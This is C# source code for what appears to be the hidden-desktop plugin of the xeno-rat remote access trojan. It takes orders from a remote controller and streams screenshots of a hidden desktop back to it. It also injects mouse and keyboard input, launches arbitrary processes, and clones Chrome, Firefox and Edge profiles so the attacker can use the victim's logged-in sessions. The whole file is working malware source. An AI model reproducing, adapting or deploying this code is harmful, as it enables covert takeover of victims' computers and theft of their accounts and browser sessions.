using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using xeno_rat_client;
using Hidden_handler;
using System.IO;
using System.Drawing;
using System.Threading;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Management;
using System.Diagnostics;

namespace Plugin
{
    public class Main
    {
        Node ImageNode;
        bool playing = false;
        int quality = 100;
        bool do_browser_clone = false;
        bool cloning_chrome = false;
        bool cloning_firefox = false;
        bool cloning_edge = false;
        bool has_clonned_chrome = false;
        bool has_clonned_firefox=false;
        bool has_clonned_edge = false;
        Imaging_handler ImageHandler;
        input_handler InputHandler;
        Process_Handler ProcessHandler;
        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
            if (!await AcceptSubSubNode(node))
            {
                ImageNode?.Disconnect();
                node.Disconnect();
            }
            Thread thread = new Thread(async()=>await ScreenShotThread());
            thread.Start();
            try
            {
                string DesktopName=Encoding.UTF8.GetString(await node.ReceiveAsync());
                ImageHandler = new Imaging_handler(DesktopName);
                InputHandler = new input_handler(DesktopName);
                ProcessHandler = new Process_Handler(DesktopName);
                while (node.Connected())
                {
                    byte[] data = await node.ReceiveAsync();
                    if (data == null)
                    {
                        ImageNode?.Disconnect();
                        break;
                    }
                    if (data[0] == 0)
                    {
                        playing = true;
                    }
                    else if (data[0] == 1)
                    {
                        playing = false;
                    }
                    else if (data[0] == 2)
                    {
                        quality = node.sock.BytesToInt(await node.ReceiveAsync());
                    }
                    else if (data[0] == 3)
                    {
                        uint msg = (uint)node.sock.BytesToInt(await node.ReceiveAsync());
                        IntPtr wParam = (IntPtr)node.sock.BytesToInt(await node.ReceiveAsync());
                        IntPtr lParam = (IntPtr)node.sock.BytesToInt(await node.ReceiveAsync());
                        new Thread(() => InputHandler.Input(msg, wParam, lParam)).Start();
                    }
                    else if (data[0] == 4)
                    {
                        ProcessHandler.StartExplorer();
                    }
                    else if (data[0] == 5)
                    {
                        ProcessHandler.CreateProc(Encoding.UTF8.GetString(await node.ReceiveAsync()));
                    }
                    else if (data[0] == 6)
                    {
                        do_browser_clone = true;
                    }
                    else if (data[0] == 7)
                    {
                        do_browser_clone = false;
                    }
                    else if (data[0] == 8)
                    { //start chrome
                        if (do_browser_clone && !has_clonned_chrome)
                        {
                            has_clonned_chrome = true;
                            HandleCloneChrome();
                        }
                        else 
                        {
                            ProcessHandler.StartChrome();
                        }
                    }
                    else if (data[0] == 9)
                    { //start firefox
                        if (do_browser_clone && !has_clonned_firefox)
                        {
                            has_clonned_firefox = true;
                            HandleCloneFirefox();

                        }
                        else
                        {
                            ProcessHandler.StartFirefox();
                        }
                    }
                    else if (data[0] == 10)
                    { //start edge
                        if (do_browser_clone && !has_clonned_edge)
                        {
                            has_clonned_edge = true;
                            HandleCloneEdge();

                        }
                        else
                        {
                            ProcessHandler.StartEdge();
                        }
                    }
                }
            }
            catch
            {

            }
            node.Disconnect();
            ImageNode?.Disconnect();
            ImageHandler?.Dispose();
            InputHandler?.Dispose();
            GC.Collect();

        }

        private async Task<int> GetProcessViaCommandLine(string processName, string searchString) {
            return await Task.Run(() =>
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher($"SELECT * FROM Win32_Process WHERE Name = '{processName}'");

                foreach (ManagementObject obj in searcher.Get())
                {
                    string commandLine = obj["CommandLine"]?.ToString();

                    if (commandLine != null && commandLine.Contains(searchString))
                    {
                        return Convert.ToInt32(obj["ProcessId"]);
                    }
                }

                return -1;
            });
        }


        private async Task HandleCloneChrome()
        {
            if (!cloning_chrome)
            {
                cloning_chrome = true;
                if (!await ProcessHandler.CloneChrome())
                {
                    int pid = await GetProcessViaCommandLine("chrome.exe", "ChromeAutomationData");
                    if (pid != -1)
                    {
                        Process p = Process.GetProcessById(pid);
                        try
                        {
                            p.Kill();
                            await ProcessHandler.CloneChrome();
                        }
                        catch { }
                        p.Dispose();
                    }
                }
                ProcessHandler.StartChrome();
                cloning_chrome = false;
            }
        }
        private async Task HandleCloneFirefox()
        {
            if (!cloning_firefox)
            {
                cloning_firefox = true;
                if (!await ProcessHandler.CloneFirefox())
                {
                    int pid = await GetProcessViaCommandLine("firefox.exe", "FirefoxAutomationData");
                    if (pid != -1)
                    {
                        Process p = Process.GetProcessById(pid);
                        try
                        {
                            p.Kill();
                            await ProcessHandler.CloneFirefox();
                        }
                        catch { }
                        p.Dispose();
                    }
                }
                ProcessHandler.StartFirefox();
                cloning_firefox = false;
            }
        }
        private async Task HandleCloneEdge()
        {
            if (!cloning_edge)
            {
                cloning_edge = true;
                if (!await ProcessHandler.CloneEdge())
                {
                    int pid = await GetProcessViaCommandLine("msedge.exe", "EdgeAutomationData");
                    if (pid != -1)
                    {
                        Process p = Process.GetProcessById(pid);
                        try
                        {
                            p.Kill();
                            await ProcessHandler.CloneEdge();
                        }
                        catch { }
                        p.Dispose();
                    }
                }
                ProcessHandler.StartEdge();
                cloning_edge = false;
            }
        }
        public async Task ScreenShotThread()
        {
            try
            {
                
                while (ImageNode.Connected())
                {
                    if (!playing)
                    {
                        await Task.Delay(500);
                        continue;
                    }
                    try
                    {
                        Bitmap img = ImageHandler.Screenshot();
                        EncoderParameters encoderParams = new EncoderParameters(1);
                        encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);

                        ImageCodecInfo codecInfo = GetEncoderInfo(ImageFormat.Jpeg);
                        byte[] data;
                        using (MemoryStream stream = new MemoryStream())
                        {
                            img.Save(stream, codecInfo, encoderParams);
                            data= stream.ToArray();
                        }
                        await ImageNode.SendAsync(data);
                    }
                    catch
                    {

                    }
                }
            }
            catch { }
        }
        private static ImageCodecInfo GetEncoderInfo(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();

            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }

            return null;
        }
        public async Task<bool> AcceptSubSubNode(Node node)
        {
            byte[] id = await node.ReceiveAsync();
            if (id != null)
            {
                int nodeid = node.sock.BytesToInt(id);
                Node tempnode = null;
                foreach (Node i in node.Parent.subNodes)
                {
                    if (i.SetId == nodeid)
                    {
                        await node.SendAsync(new byte[] { 1 });
                        tempnode = i;
                        break;
                    }
                }
                if (tempnode == null)
                {
                    await node.SendAsync(new byte[] { 0 });
                    return false;
                }
                node.AddSubNode(tempnode);
                ImageNode = tempnode;
                return true;
            }
            else
            {
                return false;
            }
        }
    }
}
